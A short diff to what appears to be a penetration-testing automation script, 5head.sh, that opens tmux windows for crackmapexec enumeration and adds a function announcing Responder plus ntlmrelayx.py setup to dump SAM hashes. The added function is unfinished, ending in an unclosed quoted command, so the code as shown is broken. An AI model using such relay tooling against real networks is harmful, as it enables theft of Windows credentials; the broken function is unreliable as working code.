@@ -115,6 +115,15 @@ function cme_enum() {
         tmux send-keys -t 5head:cme_enum 'tail -f loot/cme_enum.txt' C-m
 }
 
+function resp_ntlmrelay_1() {
+	echo -e '[*] Setting up Responder + Ntlmrelayx.py (SAM dump)...\n\n'
+	tmux new-window -n "relay"
+	tmux send-keys -t 5head:relay 'PROMPT="%F{9}5head.sh%f > "' C-m
+	tmux send-keys -t 5head:relay 'clean' C-m
+	tmux send-keys -t 5head:relay '
+}
+
+
 function debug() {
         echo "test"
         tmux show-environment
